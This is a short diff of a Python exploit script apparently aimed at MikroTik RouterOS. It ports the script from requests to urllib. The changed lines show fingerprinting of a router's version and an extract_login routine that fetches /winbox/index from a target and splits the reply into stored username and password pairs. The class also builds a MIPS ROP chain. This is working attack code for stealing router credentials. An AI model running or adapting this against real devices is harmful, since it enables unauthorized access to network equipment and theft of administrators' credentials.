@@ -1,4 +1,4 @@
-import requests,socket,hashlib,sys
+import urllib,socket,hashlib,sys
 from time import sleep
 
 class printer():
@@ -30,8 +30,8 @@ class Vuln():
 		self.ropChainmips=self.get_rop_mips()
 		self.ismips=False
 	def get_version(self):
-		resp = requests.get('http://%s:%s'%(self.ip,self.port))
-		response = resp.content.decode('utf-8','ignore')
+		resp = urllib.urlopen('http://%s:%s'%(self.ip,self.port))
+		response = resp.read().decode('utf-8','ignore')
 		read_index=response.find('<h1>RouterOS ')
 		from_header=response[read_index+14:]
 		end_index=from_header.find('</h1>')
@@ -86,8 +86,8 @@ class Vuln():
 	def extract_login(self):
 		self.results=[]
 
-		req=requests.get("http://%s:%s/winbox/index"%(self.ip,self.port))
-		userdata=req.content
+		req=urllib.urlopen("http://%s:%s/winbox/index"%(self.ip,self.port))
+		userdata=req.read()
 		user_pass_pairs=userdata.split(b"M2")[1:]
 		for i in user_pass_pairs:
 			usrdata=i.split(b"\x01\x00\x00\x21")[1]
